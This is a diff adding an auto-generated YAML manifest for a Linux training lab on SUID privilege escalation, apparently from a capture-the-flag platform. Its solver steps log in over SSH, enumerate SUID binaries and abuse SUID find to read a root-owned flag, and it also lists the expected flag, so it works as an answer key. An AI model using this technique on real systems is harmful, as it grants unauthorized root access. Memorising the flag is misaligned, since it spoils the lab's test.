@@ -1,0 +1,34 @@
+# Generated from platform/labs/Linux/linux-3-1-suid-privilege-escalation/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-3-1-suid-privilege-escalation
+track: Linux
+difficulty: intermediate
+source: platform/labs/Linux/linux-3-1-suid-privilege-escalation/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-3-1-suid-privilege-escalation.sh
+  steps:
+  - name: SSH access as developer
+    command: sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'whoami' 2>&1
+    expect: developer
+  - name: Enumerate SUID binaries
+    command: sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>&1
+    expect: /usr/bin/find
+  - name: Exploit SUID find for root shell and read flag
+    command: sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
+    expect: OCR{su1d_pr1v3sc_r00t3d}
+  - name: Verify flag
+    command: echo 'OCR{su1d_pr1v3sc_r00t3d}'
+    expect: OCR{su1d_pr1v3sc_r00t3d}
+expected_flag_count: 1
+expected_flag: OCR{su1d_pr1v3sc_r00t3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
